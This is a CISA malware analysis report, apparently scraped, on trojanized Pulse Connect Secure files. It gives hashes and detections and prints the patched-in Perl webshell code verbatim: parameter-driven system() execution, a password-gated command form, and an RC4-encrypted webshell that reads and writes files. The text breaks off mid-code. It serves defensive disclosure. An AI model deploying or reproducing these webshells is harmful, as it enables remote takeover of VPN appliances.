{
  "markdown": "\n\nSummary\n\n\n\n\n\n\n\nNotification\n\nThis report is provided \"as is\" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained herein. The DHS does not endorse any commercial product or service referenced in this bulletin or otherwise.\nThis document is marked TLP:WHITE--Disclosure is not limited. Sources may use TLP:WHITE when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. For more information on the Traffic Light Protocol (TLP), see http://www.cisa.gov/tlp.\n\nSummary\n\nDescription\nCISA received eight files for analysis. These files are Pulse Secure system applications which have been modified by a malicious cyber actor. The primary purpose of these system modifications is to provide a remote operator command and control (C2) access over a compromised device running the modified Pulse Secure software. This analysis is derived from malicious files found on Pulse Connect Secure devices.\nFor a downloadable copy of IOCs, see: MAR-10335467-1.v1.WHITE.stix.\nSubmitted Files (8)\n1e862c3be851c984843f8b36e14decc1b25aed75e1bee4fd184ca70c4aaa7d56 (clear_log.sh)\n463023f0969b2b52bc491d8787de876e59f0d48446f908d16d1ce763bbe05ee9 (DSUpgrade.pm)\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767 (DSUpgrade.pm)\n829b3a9e91ed8c2a0a9d77ea9c4d8adeb0b815e03502d7b5d643400d3b0828bf (healthcheck.cgi)\n859bfee6ebbc8823e998fe7140303292c2925f57a11368d1be5b393b1015f136 (compcheckjava.cgi)\nc366c9d41c2bff9fce8a74e2a323f2e104149cf993413dddd8514bb69b054d69 (DSUpgrade.pm)\ndb389b866913e5af287eb3288cc1f5e8a114484bb9309cc05afbea8943d0887c (meeting_testjs.cgi)\ne1efbc8b6ed320bc5762ebd6d59b8ba4c5792c4a6e7f3a605c8c7cb61fadd9a2 (licenseserverproto.cgi)\n\nFindings\n\n463023f0969b2b52bc491d8787de876e59f0d48446f908d16d1ce763bbe05ee9\nTags\ntrojanwebshell\nDetails\n\n\n\nName\nDSUpgrade.pm\n\n\nSize\n5361 bytes\n\n\nType\nPerl5 module source, ASCII text, with very long lines\n\n\nMD5\n6644c8001e89069128a6def1772ab104\n\n\nSHA1\nbca88545f0e413112e1463d9944a9c217e8ddf83\n\n\nSHA256\n463023f0969b2b52bc491d8787de876e59f0d48446f908d16d1ce763bbe05ee9\n\n\nSHA512\n46273c43a98e3b4a7c7d7daefdb0059b0cd72fa449c86238b80fced095236d33be8e522ccc9c32b3d1fe1855910ff1a43a2b2f583c3547a9e563380d9c47d62b\n\n\nssdeep\n96:FYIFAu1JZtGm4OcAHgDfX2SAF1D2smrsvWlgzP5Ft8gb16rJ2yXp6uIvWZlGMQbl:eIB1XcTfX2hgsmrs+gF3Ar8yXp6uIyUj\n\n\nEntropy\n5.038950\n\n\n\nAntivirus\n\n\n\nClamAV\nUnix.Trojan.ATRIUM-9855919-0\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThe file contains malicious code that was patched into the Pulse Secure application.\n\n\t\t\t--Begin Legitimate Code--\n\t\t\tsub extractPackage {\n\t\t\tmy ($path, $console, $html) = @_;\n\t\t\treturn \"No content read from package file\" if (-z $path);\n\n\t\t\t$ENV{\"DSINSTALL_PACKAGE\"} = $path;\n\n\t\t\tprint $html \"<li style=\\\"margin:6px;\\\">Step 1: Verifying package integrity ...\";\n\t\t\tprint $console \"Verifying package integrity ...\";\n\n\t\t\tlocal *FH;\n\t\t\tmy $prog = \"/pkg/packdecrypt\";\n\t\t\tpopen(*FH, \"$prog $path /tmp/new-pack.tgz\");\n\n\t\t\tmy $buffer;\n\t\t\tmy ($rin, $rout, $rerr) = ('','', '');\n\t\t\tvec($rin, fileno(*FH), 1) = 1;\n\t\t\tmy $ts = time;\n\t\t\twhile (1) {\n\t\t\t\u00a0\u00a0\u00a0 my ($nfound, $timeleft) = select($rout=$rin, undef, undef, 1);\n\t\t\t\u00a0\u00a0\u00a0 if ($nfound) {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 my $n = sysread(*FH, $buffer, 64);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 last if !$n;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $html $buffer;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 else {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $html '.';\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 print $console \".\";\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t}\n\t\t\tclose(*FH);\n\t\t\t--End Legitimate Code--\n\n\t\t\t--Begin Malicious Code--\n\t\t\tmy $cgi_p=\"/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi\";\n\t\t\tmy $cmd_x=\"sed -i '/echo_console \\\"Saving package\\\"/i(sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");}else{&main();}\\\\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install\";\n\t\t\tsystem(\"/bin/mount -o remount,rw /dev/root /\");\n\t\t\tsystem(\"/bin/tar\", \"-xzf\", \"/tmp/new-pack.tgz\", \"-C\", \"/tmp\",\"./installer\");\n\t\t\tsystem(\"cp -f /tmp/installer/do-install /pkg/\");\n\t\t\t#system(\"cp -f /tmp/installer/VERSION /pkg/\");\n\t\t\tsystem(\"cp -f /tmp/installer/sysboot-shlib /pkg/\");\n\t\t\tsystem(\"cp -f /tmp/installer/losetup /pkg/\");\n\t\t\tprint $html system(\"$cmd_x\");\n\t\t\t#print $html system(\"sed -i '/echo_console \\\"Saving package\\\"/i$cmd_x' /pkg/do-install\");\n\t\t\tsystem(\"rm -rf /tmp/installer\");\n\t\t\tmy $td = time - $ts;\n\t\t\tmy $status = $? % 255;\n\t\t\tif ($status == 0) {\n\t\t\t\u00a0\u00a0\u00a0print $html \" complete ($td seconds)</li>\";\n\t\t\t\u00a0\u00a0\u00a0print $console \" complete\\r\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\u00a0\u00a0\u00a0print $html \" failed</li>\";\n\t\t\t\u00a0\u00a0\u00a0print $console \" failed\\r\\n\";\n\t\t\t}\n\n\n\t\t\treturn $status == 0;\n\t\t\t}\n\t\t\t--End Malicious Code--\n\n\t\t\tThe patched in code will leverage the following SED command to patch a malicious webshell into the Pulse Secure system file /pkg/do-install:\n\n\t\t\t--Begin Malicious SED Command--\n\t\t\t\"sed -i '/echo_console \\\"Saving package\\\"/i(sed -i \\\\\\'/main();\\\\\\$/cif(CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\")){print \\\\\\\\\\\"Cache-Control: no-cache\\\\\\\\\\\\\\\\n\\\\\\\\\\\";print \\\\\\\\\\\"Content-type: text/html\\\\\\\\\\\\\\\\n\\\\\\\\\\\\\\\\n\\\\\\\\\\\";my \\\\\\\\\\$na=CGI::param(\\\\\\\\\\\"id\\\\\\\\\\\");system(\\\\\\\\\\\"\\\\\\\\\\$na\\\\\\\");}else{&main();}\\\\\\' /tmp/data/root$cgi_p;cp -f /home/perl/DSUpgrade.pm /tmp/data/root/home/perl;cp -f /pkg/dspkginstall /tmp/data/root/pkg/;)' /pkg/do-install\";\n\t\t\t--End Malicious SED Command--\n\n\t\t\tThe purpose of the webshell is to accept a parameter named \"id\" from within an incoming web application post. The webshell will then process the data provided within the \"id\" parameter as an operating system command by executing it locally utilizing the system() function.\n\n\ndb389b866913e5af287eb3288cc1f5e8a114484bb9309cc05afbea8943d0887c\nTags\nwebshell\nDetails\n\n\n\nName\nmeeting_testjs.cgi\n\n\nSize\n3003 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\n07eb01481c6b72800c0a0eed17a2b3bd\n\n\nSHA1\n9df4c1e279e9f9cdd2e5b4fe919490256cfb7adf\n\n\nSHA256\ndb389b866913e5af287eb3288cc1f5e8a114484bb9309cc05afbea8943d0887c\n\n\nSHA512\n8d1763fe185d97b0a7393347cedd6a6b896cf7563e486fab318bb2a88a68e12972c54a4740983f779cad46a78b3ffd1050c1302fdbcbd38dc724be06e734d4c0\n\n\nssdeep\n48:E1LYmef1MmZ1rk5s+y93VuIxsv9vheLvxkbYu6O9GnMr3mNdLAZkV3R8ewRRVfZQ:EJYb5ZBkO+ypVVxsv9vheLvxkV6O9Gnh\n\n\nEntropy\n5.520210\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure Common Gateway Interface (CGI) application with the following malicious code patched in. This code is designed to perform an initial check to determine whether data was passed into the web application within a parameter named \"id\". If this parameter is provided, the code will extract its contents and execute them on the target system using the sytem() function. If no \"id\" parameter is passed to the application, the code will simply execute the main() function of the original Pulse Secure application.\n\n\t\t\t--Begin Patched In Malicious Code--\n\t\t\tif(CGI::param(\"id\")){print \"Cache-Control: no-cache\\n\";print \"Content-type: text/html\\n\\n\";my $na=CGI::param(\"id\");system(\"$na\");}else{&main();}\n\t\t\t--End Patched In Malicious Code--\n\n\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767\nTags\nwebshell\nDetails\n\n\n\nName\nDSUpgrade.pm\n\n\nSize\n9791 bytes\n\n\nType\nPerl5 module source, ASCII text\n\n\nMD5\n4d5b410e1756072a701dfd3722951907\n\n\nSHA1\ncc68a9c5ff57129e8b897d228e54807841f8ff67\n\n\nSHA256\n6959bbbe345b9699282b8a599b6a65e53731720905e2a40aaca16fa796ffe767\n\n\nSHA512\n965b13b1a11c2b2472de1f491bb3fde1d96288fa204428b135281ae7928a5bafea5c244fdd1f47a96242861c94a4fa8d5f6664f543dec33cfc519faca044766d\n\n\nssdeep\n192:eIB1XcTfXss+nBqXb+TSWbgXCiwWjoBTWFI4MhiirXHLwQBNaBiF3Ar8yXpayUM6:eIB1X1phiJ/irZNaBiF3CjCswmPyVoM\n\n\nEntropy\n5.235000\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure Perl application that has been modified to add webshell script code into the content of the Pulse Secure Perl CGI script file \"/root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi.\"\n\n\t\t\tThe script contains the following patched in commented out code:\n\n\t\t\t\u2014Begin Patched In Commented CGI Code\u2014\n\t\t\t###scriptstart\n\t\t\t#/bin/mount -o remount,rw /dev/root /\n\t\t\t#/bin/tar -xzf $innerarchive ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/tar -xzf $innerarchive ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w 7CxA1p' outer-do-install\n\t\t\t#/bin/sed -i '/DSINSTALL_CLEAN/r 7CxA1p' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w GqTv3w' outer-do-install\n\t\t\t#/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w Vi6d8h4' outer-do-install\n\t\t\t#/bin/sed -i '/^use DSUtilTable/r GqTv3w' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/^sub main/r Vi6d8h4' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/sed -i '/\\#\\#perlstart/,/\\#\\#perlend/s/#//' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/sed -i '/\\#\\#scriptstart/,/\\#\\#scriptend/s/^/#/' ./root/home/perl/DSUpgrade.pm\n\t\t\t#/usr/bin/gzip -d $innerarchive\n\t\t\t#/bin/tar -f /tmp/inside-package.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\n\t\t\t#/bin/tar -f /tmp/inside-package.tar -u ./root/home/perl/DSUpgrade.pm\n\t\t\t#/bin/rm -f 7CxA1p\n\t\t\t#/bin/rm -f GqTv3w\n\t\t\t#/bin/rm -f Vi6d8h4\n\t\t\t#/bin/rm -fr root\n\t\t\t#/usr/bin/gzip -c /tmp/inside-package.tar > $innerarchive\n\t\t\t###scriptend\n\n\t\t\t###cgistart1\n\t\t\t#use lib ($ENV{'DSINSTALL'} =~ /(\\S*)/)[0] . \"/perl/lib\";\n\t\t\t#use lib ($ENV{'DSINSTALL'} =~ /(\\S*)/)[0] . \"/perl/lib/MIME/Base64\";\n\t\t\t#use Crypt::RC4;\n\t\t\t#use MIME::Base64 ();\n\t\t\t#\n\t\t\t#sub parse_parameters ($) {\n\t\t\t# my %ret;\n\t\t\t#\n\t\t\t# my $input = shift;\n\t\t\t#\n\t\t\t# foreach my $pair (split('&', $input)) {\n\t\t\t# \u00a0\u00a0\u00a0my ($var, $value) = split('=', $pair, 2);\n\t\t\t# \u00a0\u00a0\u00a0\n\t\t\t# \u00a0\u00a0\u00a0if($var) {\n\t\t\t# \u00a0\u00a0\u00a0 $value =~ s/\\+/ /g ;\n\t\t\t# \u00a0\u00a0\u00a0 $value =~ s/%(..)/pack('c',hex($1))/eg;\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0 $ret{$var} = $value;\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t# }\n\t\t\t#\n\t\t\t# return %ret;\n\t\t\t#}\n\t\t\t###cgiend1\n\n\t\t\t###cgistart2\n\t\t\t# \u00a0\u00a0\u00a0my $enckey='1234567';\n\t\t\t# \u00a0\u00a0\u00a0my $data='1234567812345678';\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $cipher = RC4($enckey, $data); \u00a0\u00a0\u00a0\n\t\t\t# \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0my $encode = MIME::Base64::encode($cipher);\n\t\t\t# \u00a0\u00a0\u00a0my $psalLaunch = CGI::param(\"serverid\");\n\t\t\t# \u00a0\u00a0\u00a0if ($psalLaunch =~ /csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa/)\n\t\t\t# \u00a0\u00a0\u00a0{\n\t\t\t# \u00a0\u00a0\u00a0my ($cmd, %FORM);\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0$|=1;\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0print \"Content-Type: text/html\\r\\n\";\n\t\t\t# \u00a0\u00a0\u00a0print \"\\r\\n\";\n\t\t\t# \u00a0\u00a0\u00a0%FORM = parse_parameters($ENV{'QUERY_STRING'});\n\t\t\t#\n\t\t\t# \u00a0\u00a0\u00a0if(defined $FORM{'cmd'}) {\n\t\t\t# \u00a0\u00a0\u00a0 $cmd = $FORM{'cmd'};\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t#\n\t\t\t#print '<HTML>\n\t\t\t#<body>\n\t\t\t#<form action=\"\" method=\"GET\">\n\t\t\t#<input type=\"text\" name=\"cmd\" size=45 value=\"' . $cmd . '\">\n\t\t\t#<input type=\"text\" name=\"serverid\" size=45 value=\"csJ1TA45JzB0WJrjA5X8dpVbXcrDMVfa\">\n\t\t\t#<input type=\"submit\" value=\"Run\">\n\t\t\t#</form>\n\t\t\t#<pre>';\n\t\t\t#\n\t\t\t#if(defined $FORM{'cmd'}) {\n\t\t\t# print \"Results of '$cmd' execution:\\n\\n\";\n\t\t\t# print \"-\"x80;\n\t\t\t# print \"\\n\";\n\t\t\t#\n\t\t\t# print $encode;\n\t\t\t# system $cmd;\n\t\t\t# print \"-\"x80;\n\t\t\t# print \"\\n\";\n\t\t\t#}\n\t\t\t# print \"</pre>\";\n\t\t\t# exit(0);\n\t\t\t# \u00a0\u00a0\u00a0}\n\t\t\t###cgiend2\n\n\t\t\t##end_total\n\t\t\t--End Patched In Commented CGI Code--\n\n\t\t\tThe Pulse Secure Perl script also contains the following suspicious live/uncommentedcode. This code is designed to modify several Pulse Secure system files using the SED command as well as attempt to install code from within an archive named new-pack.tgz expected to be currently stored on the target system.\n\n\t\t\t--Begin Patched In Live/Uncommented Code--\n\t\t\tsub installPackage {\n\t\t\tmy ($clean, $console, $html) = @_;\n\n\t\t\t$ENV{\"DSINSTALL_CLEAN\"} = $clean;\n\n\t\t\t##start_total\n\t\t\t##perlstart\n\t\t\tsystem(\"/bin/mount -o remount,rw /dev/root /\");\n\t\t\tsystem(\"/bin/tar -xzf /tmp/new-pack.tgz ./installer/outer-do-install\");\n\t\t\tmy $statushh = $? % 255;\n\t\t\tif( $statushh != 0 )\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -xzf /tmp/new-pack.tgz ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -xzf /tmp/new-pack.tgz ./root/home/perl/DSUpgrade.pm\"); \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w K872Bu' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/DSINSTALL_CLEAN/r K872Bu' ./root/home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/w Mj1Za' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/w 1uMfVB' /home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/^use DSUtilTable/r Mj1Za' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/^sub main/r 1uMfVB' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart1/,/\\#\\#cgiend1/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/sed -i '/\\#\\#cgistart2/,/\\#\\#cgiend2/s/#//' ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/usr/bin/gzip -d /tmp/new-pack.tgz\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -f /tmp/new-pack.tar -u ./root/home/webserver/htdocs/dana-na/licenseserver/licenseserverproto.cgi\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/tar -f /tmp/new-pack.tar -u ./root/home/perl/DSUpgrade.pm\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f K872Bu\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f Mj1Za\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -f 1uMfVB\"); \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/bin/rm -fr root\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"rm -f /tmp/new-pack.tgz\");\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0system(\"/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz\"); \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t}\n\t\t\telse{\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#start_total/,/\\#\\#end_total/w Nc3Gy.pm' /home/perl/DSUpgrade.pm\");\n\t\t\tsystem(\"/bin/sed -i '/packdecrypt/r Nc3Gy.pm' ./installer/outer-do-install\");\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#perlstart/,/\\#\\#perlend/s/^/#/' ./installer/outer-do-install\");\n\t\t\tsystem(\"/bin/sed -i '/\\#\\#scriptstart/,/\\#\\#scriptend/s/#//' ./installer/outer-do-install\");\n\t\t\tsystem(\"/usr/bin/gzip -d /tmp/new-pack.tgz\");\n\t\t\tsystem(\"/bin/tar -f /tmp/new-pack.tar -u ./installer/outer-do-install\");\n\t\t\tsystem(\"rm -f Nc3Gy.pm\");\n\t\t\tsystem(\"rm -f /tmp/new-pack.tgz\");\n\t\t\tsystem(\"/usr/bin/gzip -c /tmp/new-pack.tar > /tmp/new-pack.tgz\");\n\t\t\tsystem(\"rm -fr installer\");\n\t\t\t}\n\t\t\t--End Patched In Live/Uncommented Code--\n\n\t\t\tAnalysis indicates this live/uncommented code is designed to present a web form to a remote operator, wherein the remote operator can enter commands that will be run locally on the target system. The live/uncommented code also has the capability to modify several Pulse Secure system files utilizing the SED command.\n\n\n829b3a9e91ed8c2a0a9d77ea9c4d8adeb0b815e03502d7b5d643400d3b0828bf\nTags\nwebshell\nDetails\n\n\n\nName\nhealthcheck.cgi\n\n\nSize\n9275 bytes\n\n\nType\nPerl script text executable\n\n\nMD5\ndee973c4ba232541b689b67ab41aa925\n\n\nSHA1\n7b0bc1c2442d672ffbd1cc0a9e67dbeae4d72f52\n\n\nSHA256\n829b3a9e91ed8c2a0a9d77ea9c4d8adeb0b815e03502d7b5d643400d3b0828bf\n\n\nSHA512\n08f5c21c303a38a671c17e6731ef45aa39f581db632d8f2c0c674fe44927d05152691ff31b38d874fffb87b5fa02e4c82efe0a962cc4fd1cb28ba61d0f648955\n\n\nssdeep\n192:XzwJNuIYj7rcCOk1QrhMeWyOUV9AWojcZiOQiQsfinnoK9Cih1pa+7yiEhm:XzwJwrXWOUV9AWojoiOugQ\n\n\nEntropy\n5.120132\n\n\n\nAntivirus\n\n\n\nSymantec\nHacktool.Webshell\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nDescription\nThis file is a Pulse Secure CGI script that contains malicious code that was patched into the file. The modification modifies the file to become a webshell. The following code includes comments that provides information on the capabilities of this patched webshell:\n\n\t\t\t--Begin Malicious Code--\n\t\t\tif ($ENV\n\t\t\t{\n\t\t\t'REQUEST_METHOD'\n\t\t\t} \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//CISA COMMENT: $ph variable contains RC4 crypto key\n\t\t\teq \"POST\") $ph=\"[REDACTED]\";\n\t\t\tsub r \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: Generate random block of data\n\t\t\t{\n\t\t\tmy $n=$_[0];\n\t\t\tmy $rs;\n\t\t\tfor (my $i=0;$i<$n;$i++)\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 my $n1=int(rand(256));\n\t\t\t\u00a0\u00a0\u00a0 $rs.=chr($n1);\n\t\t\t}\n\t\t\treturn $rs;\n\t\t\t}\n\t\t\tsub a \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: RC4 / BASE64 decryption function\n\t\t\t{\n\t\t\tmy $st=$_[0];\n\t\t\tmy $k=r(6);\n\t\t\tmy $en = RC4( $k.$ph, $st);\n\t\t\treturn encode_base64($k.$en);\n\t\t\t}\n\t\t\tsub b \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: RC4 / BASE64 decryption function\n\t\t\t{\n\t\t\tmy $s= decode_base64($_[0]);\n\t\t\tmy $l=length($s);\n\t\t\tmy $k= substr($s,0,6);\n\t\t\tmy $en=substr($s,6,$l-6);\n\t\t\tmy $de = RC4( $k.$ph, $en );\n\t\t\treturn $de;\n\t\t\t}\n\t\t\tsub c \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: Download File from target system\n\t\t\t{\n\t\t\tmy $fi=CGI::param('img');\n\t\t\tmy $FN=b($fi);\n\t\t\tmy $fd;\n\t\t\tprint \"Content-type: application/x-download\\n\";\n\t\t\topen(*FILE, \"<$FN\" );\n\t\t\twhile(<FILE>)\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 $fd=$fd.$_;\n\t\t\t}\n\t\t\tclose(*FILE);\n\t\t\tprint \"Content-Disposition: attachment; filename=tmp\\n\\n\";\n\t\t\tprint a($fd); \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//CISA COMMENT: RC4 ENCRYPT and BASE64 encode file before giving it to operator\n\t\t\t}\n\t\t\tsub d.\n\t\t\t{\n\t\t\tprint \"Cache-Control: no-cache\\n\";\n\t\t\tprint \"Content-type: text/html\\n\\n\";\n\t\t\tmy $fi = CGI::param('cert'); \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0//CISA COMMENT: 'cert' contains name of the file to be written.\n\t\t\t$fi=b($fi);\n\t\t\tmy $pa=CGI::param('md5'); \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: 'md5' contains the content to be written to file.\n\t\t\t$pa=b($pa);\n\t\t\topen (*outfile, \">$pa\");\n\t\t\tprint outfile $fi; \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 //CISA COMMENT: The content is written to the file.\n\t\t\tclose (*outfile);\n\t\t\t}\n\t\t\tsub e \u00a0\u00a0\u00a0 //CISA COMMENT: Decrypt and execute provided system command\n\t\t\t{\n\t\t\tprint \"Cache-Control: no-cache\\n\";\n\t\t\tprint \"Content-type: image/gif\\n\\n\";\n\t\t\tmy $na=CGI::param('name');\n\t\t\t$na=b($na); \u00a0\u00a0\u00a0//CISA COMMENT: Base64 decode and RC4 decrypt incoming command\n\t\t\tmy $rt;\n\t\t\tif (!$na or $na eq \"cd\")\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 $rt=\"Error 404\";\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 my $ot=\"/tmp/1\";\n\t\t\t\u00a0\u00a0\u00a0 system(\"$na >/tmp/1 2>&1\"); \u00a0\u00a0\u00a0 //CISA COMMENT: Execute decrypted command\n\t\t\t\u00a0\u00a0\u00a0 open(*cmd_result,\"<$ot\");\n\t\t\t\u00a0\u00a0\u00a0 while(<cmd_result>)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 $rt=$rt.$_;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 close(*cmd_result);\n\t\t\t\u00a0\u00a0\u00a0 unlink $ot\n\t\t\t}\n\t\t\tprint a($rt);\n\t\t\t}\n\t\t\tsub f\n\t\t\t{\n\t\t\tif(CGI::param('cert'))\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 d();\n\t\t\t}\n\t\t\telsif(CGI::param('img') and CGI::param('name'))\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 c(); //CISA COMMENT: Download file from system\n\t\t\t}\n\t\t\telsif(CGI::param('name') and CGI::param('img') eq \"\")\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 e(); //CISA COMMENT: Decrypt and execute provided system command\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\u00a0\u00a0\u00a0 &main();\n\t\t\t}\n\t\t\t}\n\t\t\tif 